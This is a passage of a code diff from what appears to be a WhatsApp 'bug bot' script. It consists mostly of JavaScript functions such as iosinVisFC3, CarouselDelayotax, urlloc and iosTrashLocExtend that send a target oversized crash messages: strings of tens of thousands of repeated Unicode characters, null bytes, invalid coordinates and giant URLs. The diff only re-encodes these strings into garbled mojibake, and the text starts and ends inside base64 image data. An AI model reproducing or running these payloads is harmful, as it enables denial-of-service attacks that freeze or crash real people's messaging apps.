HOeSU48V5GIC0pjSkApjXIDyVqdivg+e33qp6w5g7SmfHxcP+tqk1tkDK6Ank8H7VTdOZOkv75R2ZIonDux0bV6fLse+JsYT9m4y68N0zmtUhbUZ4dUqzaqNa7tFamCjr5XusZM0ksMNPFJJ0j4tgOBdg4y2Mlu0AQ30qDwVToX5acHh611tvErOAaoxlmmQnbSfRms7WlY9JNEn0FA+vfVvq4Ji6opY4WNZHFKzA2JHb/wBo3kOyvny8zbU7TnfhIN8lcN4C46mqNQ/adgY4ALspZwbuez6ASfxCMb8wTjH9pylVzditlHyyqVoNKYr06byI6eZzj3Do3BS+4Sh9XK4Hi4rq+LYt7NjGfs3BT+ee6BzuKW4rZOUBK8zGABRApYKIHCAcyTYId3Ki2jSC36TW6CjuE4oq6nbsRVLgS2Qcmu/FTYO9iIOI5+CkmtTLtNVOnclZSjLQ09T9H0MqX6nXF/Wp+hqWcnQzMdn2ZytDQ+8/0TyfZ+Km0Nxni7Ez2+pxCeL3XN4VUo+mV23WXd/ZZ4TJz0vDmtkl5xKA7RK8tP8AITexuVqPRG7yHBo3xDzpcMHicL0Jt/uDOzVzD6ZQzX2vmbiSqleO4vJSz6V3P1OZ+Tr+5PxR/ie+Xi7U2ilnqaKnqI6q5VbdiWSI5bEzzQeZPNTZ79okniULpC85cS495Ql2/wBK42krIr1VTxhxUY5sYqyXR6t87NkoCcrCUJKiUjSwHCEHCJAFnK3lAsBwgGbSzaQbRW9pAFtLC7uQ7S1tFAESe9aJwhJJ5rEBhOVixCXID//Z\nX-WA-BIZ-NAME:ðŸ¦ âƒ°Í¡Â°ÍœÍ¡â€¢âƒŸð˜…ð—¿Í¢ð—²Ì·ð—¹âƒ¨ð—¹ð˜†Í¢Ì·-ð—°Í¢ð—¹ð—¶âƒ¨ð—²ð—»Ì·Í¢ð˜ â¿» ð“ð¡ð«ðžðžð¬ð¢ð±ð­ð² âœ¶ > 666${"á©«á©«".repeat(4000)}\nEND:VCARD`,
                     contextInfo: {
                         participant: target,
                         externalAdReply: {
@@ -12965,8 +12965,8 @@ async function FreezePackk(tdx, target) {
     await tdx.relayMessage(target, {
         stickerPackMessage: {
             stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
-            name: "ꦾ".repeat(70000),
-            publisher: "[otax]" + "ꦾ".repeat(500),
+            name: "ê¦¾".repeat(70000),
+            publisher: "[otax]" + "ê¦¾".repeat(500),
             stickers: [],
             fileLength: "3662919",
             fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
@@ -12994,13 +12994,13 @@ async function FreezePackk(tdx, target) {
     }, {});
 }
 async function iosinVisFC3(otax, target) {
-    const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000);
-    const s = "𑇂𑆵𑆴𑆿".repeat(60000);
+    const TravaIphone = ". Ò‰ÒˆâƒâƒžâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000);
+    const s = "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000);
     try {
         let locationMessagex = {
             degreesLatitude: -999.03499999999999,
             degreesLongitude: 922.9999999999999,
-            name: " ‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
+            name: " â€¼ï¸âƒŸð•ºâƒ°â€Œð–™ð–†ð–â€Œ Ò‰ÒˆâƒâƒžâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000),
             url: "https://t.me/otax",
         }
         let msgx = generateWAMessageFromContent(target, {
@@ -13012,10 +13012,10 @@ async function iosinVisFC3(otax, target) {
         }, {});
         let extendMsgx = {
             extendedTextMessage: {
-                text: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
+                text: "â€¼ï¸âƒŸð•ºâƒ°â€Œð–™ð–†ð–â€Œ Ò‰ÒˆâƒâƒžâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£" + s,
                 matchedText: "otax",
-                description: "𑇂𑆵𑆴𑆿".repeat(60000),
-                title: "‼️⃟𝕺⃰‌𝖙𝖆𝖝‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
+                description: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000),
+                title: "â€¼ï¸âƒŸð•ºâƒ°â€Œð–™ð–†ð–â€Œ Ò‰ÒˆâƒâƒžâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000),
                 previewType: "NONE",
                 jpegThumbnail: "",
                 thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
@@ -13039,9 +13039,9 @@ async function iosinVisFC3(otax, target) {
             degreesLatitude: -999.03499999999999,
             degreesLongitude: 922.9999999999999,
             jpegThumbnail: null,
-            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
-            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
-            url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
+            name: "\u0000" + "ð‘‡‚ð‘†µð‘†´ð‘†¿ð‘†¿".repeat(15000),
+            address: "\u0000" + "ð‘‡‚ð‘†µð‘†´ð‘†¿ð‘†¿".repeat(10000),
+            url: `https://st-gacor.${"ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(25000)}.com`,
         }
         let msg = generateWAMessageFromContent(target, {
             viewOnceMessage: {
@@ -13052,10 +13052,10 @@ async function iosinVisFC3(otax, target) {
         }, {});
         let extendMsg = {
             extendedTextMessage: {
-                text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone,
-                matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
-                description: "𑇂𑆵𑆴𑆿".repeat(25000),
-                title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),
+                text: "ð”—ð”¥ð”¦ð”° â„‘ð”° ð”–ð”­ð”žð”¯ð”±ð”žð”«" + TravaIphone,
+                matchedText: "ð”–ð”­ð”žð”¯ð”±ð”žð”«",
+                description: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(25000),
+                title: "ð”–ð”­ð”žð”¯ð”±ð”žð”«" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(15000),
                 previewType: "NONE",
                 jpegThumbnail: "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",
                 thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
@@ -13204,13 +13204,13 @@ async function crashGP(otax, jidx) {
     }, {});
 }
 async function CarouselDelayotax(otax, target) {
-    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
+    console.log(chalk.red(`ð—¢ð˜ð—®ð˜… ð—¦ð—²ð—±ð—®ð—»ð—´ ð— ð—²ð—»ð—´ð—¶ð—¿ð—¶ð—º ð—•ð˜‚ð—´`));
     for (let i = 0; i < 75; i++) {
         const cards = Array.from({ length: 5 }, () => ({
-            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "otax" + "ꦽ".repeat(5000), }),
-            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "otax" + "ꦽ".repeat(5000), }),
+            body: proto.Message.InteractiveMessage.Body.fromObject({ text: "otax" + "ê¦½".repeat(5000), }),
+            footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "otax" + "ê¦½".repeat(5000), }),
             header: proto.Message.InteractiveMessage.Header.fromObject({
-                title: "otax" + "ꦽ".repeat(5000),
+                title: "otax" + "ê¦½".repeat(5000),
                 hasMediaAttachment: true,
                 imageMessage: {
                     url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
@@ -13243,7 +13243,7 @@ async function CarouselDelayotax(otax, target) {
                         name: "galaxy_message",
                         buttonParamsJson: JSON.stringify({
                             "icon": "RIVIEW",
-                            "flow_cta": "ꦽ".repeat(10000),
+                            "flow_cta": "ê¦½".repeat(10000),
                             "flow_message_version": "3"
                         })
                     },
@@ -13251,7 +13251,7 @@ async function CarouselDelayotax(otax, target) {
                         name: "galaxy_message",
                         buttonParamsJson: JSON.stringify({
                             "icon": "RIVIEW",
-                            "flow_cta": "ꦾ".repeat(10000),
+                            "flow_cta": "ê¦¾".repeat(10000),
                             "flow_message_version": "3"
                         })
                     }
@@ -13272,10 +13272,10 @@ async function CarouselDelayotax(otax, target) {
                         },
                         interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                             body: proto.Message.InteractiveMessage.Body.create({
-                                text: `§otaxUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
+                                text: `Â§otaxUdangÂ§\n${"ê¦¾".repeat(2000)}:)\n\u0000` + "ê¦¾".repeat(5000)
                             }),
                             footer: proto.Message.InteractiveMessage.Footer.create({
-                                text: "ꦽ".repeat(5000),
+                                text: "ê¦½".repeat(5000),
                             }),
                             header: proto.Message.InteractiveMessage.Header.create({
                                 hasMediaAttachment: false
@@ -13295,7 +13295,7 @@ async function CarouselDelayotax(otax, target) {
                                         name: "galaxy_message",
                                         buttonParamsJson: JSON.stringify({
                                             "icon": "RIVIEW",
-                                            "flow_cta": "ꦽ".repeat(10000),
+                                            "flow_cta": "ê¦½".repeat(10000),
                                             "flow_message_version": "3"
                                         })
                                     },
@@ -13303,7 +13303,7 @@ async function CarouselDelayotax(otax, target) {
                                         name: "galaxy_message",
                                         buttonParamsJson: JSON.stringify({
                                             "icon": "RIVIEW",
-                                            "flow_cta": "ꦾ".repeat(10000),
+                                            "flow_cta": "ê¦¾".repeat(10000),
                                             "flow_message_version": "3"
                                         })
                                     }
@@ -13648,14 +13648,14 @@ async function sendInvisibleCall(otax, target) {
     await otax.sendNode(callNode);
 }
 async function urlloc(client, target) {
-    const triggerUI = "ꦾ".repeat(61111);
+    const triggerUI = "ê¦¾".repeat(61111);
     await client.relayMessage(
         target,
         {
             locationMessage: {
                 degreesLatitude: 99999e99999,
                 degreesLongitude: -99999e99999,
-                name: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
+                name: "â€¼ï¸âƒŸ à¼š ./rÃ£ldzavgrs.   " + triggerUI,
                 inviteLinkGroupTypeV2: "DEFAULT",
                 merchantUrl: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
                 url: `https://whatsapp.${triggerUI}.crash.raldz.com/${triggerUI}/${triggerUI}/${triggerUI}/`,
@@ -13677,7 +13677,7 @@ async function urlloc(client, target) {
                             advertiserName: triggerUI,
                             mediaType: "IMAGE",
                             jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
-                            caption: "‼️⃟ ༚ ./rãldzavgrs.   " + triggerUI,
+                            caption: "â€¼ï¸âƒŸ à¼š ./rÃ£ldzavgrs.   " + triggerUI,
                         },
                         placeholderKey: {
                             remoteJid: "0@s.whatsapp.net",
@@ -13809,23 +13809,23 @@ async function callCrash(Yuukey, target) {
     await Yuukey.sendNode(stanza);
 }
 async function iosTrashLocExtend(otax, target) {
-    const TrashIosx = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ " + "𑇂𑆵𑆴𑆿".repeat(60000);
+    const TrashIosx = ". Ò‰ÒˆâƒâƒžâƒŸâƒ âƒ¤ê™°ê™²ê™±â€±áœ†á¢£ " + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(60000);
     try {
         let locationMessage = {
             degreesLatitude: -9.09999262999,
             degreesLongitude: 199.99963118999,
             jpegThumbnail: null,
-            name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
-            address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
-            url: `https://whatsappx-ios.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
+            name: "\u0000" + "ð‘‡‚ð‘†µð‘†´ð‘†¿ð‘†¿".repeat(15000),
+            address: "\u0000" + "ð‘‡‚ð‘†µð‘†´ð‘†¿ð‘†¿".repeat(10000),
+            url: `https://whatsappx-ios.${"ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(25000)}.com`,
         }
 
         let extendMsg = {
             extendedTextMessage: {
-                text: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + TrashIosx,
-                matchedText: "🧪⃟꙰。⌁ ͡ ⃰͜.ꪸꪰr4Ldz`impõssible. ✩",
-                description: "𑇂𑆵𑆴𑆿".repeat(25000),
-                title: "‼️⃟ ‌‌./r4Ldz`impõssible. ✩" + "𑇂𑆵𑆴𑆿".repeat(15000),
+                text: "â€¼ï¸âƒŸ â€Œâ€Œ./r4Ldz`impÃµssible. âœ©" + TrashIosx,
+                matchedText: "ðŸ§ªâƒŸê™°ã€‚âŒ Í¡ Íœâƒ°.êª¸êª°r4Ldz`impÃµssible. âœ©",
+                description: "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(25000),
+                title: "â€¼ï¸âƒŸ â€Œâ€Œ./r4Ldz`impÃµssible. âœ©" + "ð‘‡‚ð‘†µð‘†´ð‘†¿".repeat(15000),
                 previewType: "NONE",
                 jpegThumbnail: "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